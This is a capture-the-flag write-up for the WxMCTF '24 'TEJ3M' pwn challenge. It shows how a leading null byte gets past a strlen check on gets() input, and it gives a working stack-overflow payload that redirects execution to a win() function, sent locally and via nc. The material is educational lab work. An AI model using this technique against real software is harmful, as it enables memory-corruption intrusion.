# WxMCTF '24 Pwn 2 - TEJ3M
> Here's my TEJ3M assignment! We're learning how to use C, and I think it's pretty easy! My teacher tells us `gets` is unsafe, but I think he doesn't know how to error trap!

Because a check has been put in place, the user is not able to use a buffer overflow in order to jump to the desired code.  However, since `strlen()` determines the length of a string by reading until a NULL byte, and `gets()` does not stop reading at the NULL byte, we can insert a null byte before the input to exploit.  

First, I used `pwntools` to generate a sequence of 1000 characters.  At the time, I could not find any quick way to insert a null character at the beginning, so I put it into a file: `pwn cyclic 1000 > input`

Then, I inserted a null byte in the beginning of the file: `printf '\x00' | cat - input > newinput`.

Afterward, I piped `newinput` into the program: `./assgn1_2o3BvZ6 < newinput`

Reading the `dmesg` logs, I found this line:

```
[44930.663093] assgn1_2o3BvZ6[164177]: segfault at 61616c61 ip 0000000061616c61 sp 00000000ffbe5560 error 14 in libc.so.6[ef1bc000+1f000] likely on CPU 9 (core 3, socket 0)
```

The address it tried to jump to can be translated into ascii as `aala`.  Thus, I used `grep` to find the offset of the subsequence: `grep --byte-offset --only-matching --text "aala" newinput`
```
43:aala
```

Thankfully, the program was compiled with `-no-pie`, meaning that I can get the address of the `win()` function from `objdump`: `objdump -D assgn1_2o3BvZ6 | grep win`
```
08049216 <win>:
```

With all this knowledge, I used a simple python inline command to generate an input:
`python3 -c 'import sys; sys.stdout.buffer.write(b"\x00" + b"A" * 43 + b"\x16\x92\x04\x08")' | ./assgn1_2o3BvZ6`

However, the remote servers seem to require a newline at the end:
`python3 -c 'import sys; sys.stdout.buffer.write(b"\x00" + b"A" * 43 + b"\x16\x92\x04\x08\x0a")' | nc ... ...`

And that yields the flag: `wxmctf{1_th1nk_1_f41led...}`
